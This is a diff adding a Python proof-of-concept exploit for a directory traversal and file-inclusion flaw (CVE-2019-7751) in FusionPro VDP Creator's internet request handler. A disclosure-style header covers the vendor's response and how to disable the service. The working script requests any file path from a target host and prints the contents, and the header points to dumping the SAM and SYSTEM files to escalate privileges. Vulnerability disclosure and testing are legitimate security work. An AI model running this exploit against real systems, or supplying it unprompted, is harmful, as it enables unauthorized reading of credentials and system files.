@@ -1,0 +1,69 @@
+#!/usr/bin/env python
+
+'''
+# Exploit Title: MarcomCentral FusionPro VDP Creator < 10.0 - Directory Traversal
+# Date: 02/11/2019 
+# Exploit Author: 0v3rride
+# Vendor Homepage: https://marcom.com/
+# Software Link: http://static.pti.com/downloads/FusionPro/Win32/FusionPro_9.3.36_Setup.exe
+# Version: < 10.0 (version tested was 9.3)
+# Executable/Service: FPProducerInternetServer.exe v9.03.0036.0000 (FusionPro Internet Request Handler)
+# Tested on: Windows
+# CVE : 2019-7751
+
+Summary
+A directory traversal and local file inclusion vulnerability in the FPProducerInternetServer.exe service/utility in Ricoh MarcomCentral's, formerly PTI Marketing, FusionPro VDP Creator allows a remote attacker to list or enumerate sensitive contents of files. Furthermore, this could allow for privilege escalation by dumping the local machine's SAM and SYSTEM database files, access to common files that contain plaintext credentials, and possibly remote code execution.
+
+Attack Details
+Exploiting this vulnerability is extremely simple. This could be done from a browser like Firefox. Simply navigate the affected host (e.g. <http://><host.domain.tld>:<port#>/Windows/System32/drivers/etc/hosts. No slash-dot-dots (/../..) are required, but you can add some if you want. Note that the slashes are forward slashes! By default, the service sets up a listener on port 8080.
+
+Vendor Response
+The response I've received from the vendor suggests that they care very little about the issue despite the criticality of this class of vulnerability. I'll quote the vendors response, "just delete it". Delete what exactly? Uninstall FusionPro VDP Creator? Or should one just delete FPProducerInternetServer.exe? The vendor also wasn't clear if any of the more current versions (10.0 and 10.1) are affected. All that was sent was, "since v9.3 there have been changes to this utility to restrict access to folders". It is possible that these versions are also susceptible to the issue as well based on the response from the vendor.
+
+Resolution
+Thankfully I found some better solutions other than "just delete it".
+
+    Open services.msc
+    Look for the service named FusionPro Internet Request Handler
+    Right-click and open the properties Window
+    Stop the service if it's running
+    Select disabled startup type
+
+Or you could write a PowerShell script that does it automatically for you using the set-service and get-service cmdlets.
+
+The nuclear option would be deleting the following executable, C:\Windows\SysWOW64\FPProducerInternetServer.exe. However, I don't know what affect this will have on the machine and FusionPro VDP Creator software. You could take a gamble and upgrade to the latest version .
+'''
+
+#######################
+#   PoC by: 0v3rride  #
+#  DoC: February 2019 #
+#######################
+
+from requests import *
+from sys import *;
+
+
+def travel(fullurl):
+    r = get(fullurl);
+    print("-" * 80 + "\n[i]: Supplied URL: {}".format(fullurl))
+    print("-" * 80 + "\n[i]: Response Status Code: {}".format(r.status_code));
+    print("-" * 80 + "\n[i]: Response Headers:\n");
+
+    for hdr in r.headers:
+        print("{}: {}".format(hdr, r.headers[hdr]));
+
+    print("-" * 80 + "\n[i]: RAW DATA RETURNED FROM RESPONSE: \n{}".format(r.text));
+
+
+if len(argv) < 3:
+    print("[i]: Usage -- ./poc <http(s)://FQDN or http(s)://<IP address>:<Port #> <file to query on the local machine that is affected (e.g. /windows/system32/drivers/etc/hosts)");
+    print("[i]: Path needs to start with a '/'.");
+else:
+    try:
+        print("[i]: https://github.com/0v3rride/");
+        print("-" * 80 + "\n[!] Sending the request...");
+        travel(argv[1] + argv[2]);
+    except RequestException as re:
+        print(re.strerror);
+    finally:
+        print("-" * 80 + "\n[!] Done!");
